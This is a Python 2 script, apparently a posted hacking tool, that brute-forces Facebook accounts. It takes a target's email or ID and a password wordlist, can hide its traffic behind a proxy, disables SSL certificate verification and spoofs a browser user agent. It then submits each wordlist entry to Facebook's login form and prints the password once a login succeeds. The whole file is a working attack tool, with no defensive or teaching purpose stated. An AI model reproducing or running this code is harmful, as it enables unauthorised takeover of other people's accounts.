#import libs

import mechanize
from mechanize import *
import cookielib
import ssl
import sys
import os
from urllib3 import request
from colorama import init
from colorama import Fore, Back

#auto Change color 

init(autoreset=True)

logo = ("""
										 _____ ____  ____ ____  
										|  ___| __ )| __ ) ___| 
										| |_  |  _ \|  _ \___ \ 
										|  _| | |_) | |_) |__) |
										|_|   |____/|____/____/ 
						
									Py : The_Pharaoh   github : https://github.com/TNFT
""")
print Back.BLACK + Fore.YELLOW + logo 
proxyr = raw_input("DoYouWantToUseProxy [y/n] : ")
if proxyr == 'n' or proxyr == "N":
	pass
elif proxyr == 'y' or proxyr == "Y":
	ip = raw_input("\nEnterIpProxy : ")
	port = raw_input("EnterPortProxy : ")

	try : 
		proxy = 'http://:@%s:%s'%(ip.replace("\n",""),port.replace("\n",""))
		os.environ['http_proxy'] = proxy
		os.environ['HTTP_PROXY'] = proxy
		os.environ['https_proxy'] = proxy
		os.environ['HTTPS_PROXY'] = proxy
		print '\nProxyStarted\n'
	except:
		print Fore.RED+"\nError in Proxy .\n"
		sys.exit()

else:
	print Fore.RED + "\nError in inputs .\n"
	sys.exit()
#ssl certificates
print "\nSsl Certificates \n"
try:
    _create_unverified_https_context = ssl._create_unverified_context
except AttributeError:
    # Legacy Python that doesn't verify HTTPS certificates by default
    pass
else:
    # Handle target environment that doesn't support HTTPS verification
    ssl._create_default_https_context = _create_unverified_https_context


br = Browser()
cookieJar = cookielib.LWPCookieJar()
UA = "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0"
br.set_handle_robots(False)
br.set_handle_equiv(True)
br.set_handle_referer(True)
br.set_handle_redirect(True)
br.set_cookiejar(cookieJar)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-agent',UA)]
br.open('https://www.facebook.com/login.php')
Username = raw_input("EnterEmailfacebookOrIdForYouTarget : ")
Passlist = raw_input("EnterWordListToCrack : ")
psw = Passlist
f = open(psw,'r')
l = f.readlines()
print "\nCrack is starting : \n"
for line in l:
	br.select_form(nr=0)
	br.form['email'] = Username
	br.form['pass'] = line
	br.submit()
	trueurl = "https://www.facebook.com/"
	if br.geturl() != trueurl:
		print Fore.RED + line.replace("\n","")
	if br.geturl() == trueurl:
		print Fore.GREEN + "\nPassword = %s"%line
		exit()
	else:pass
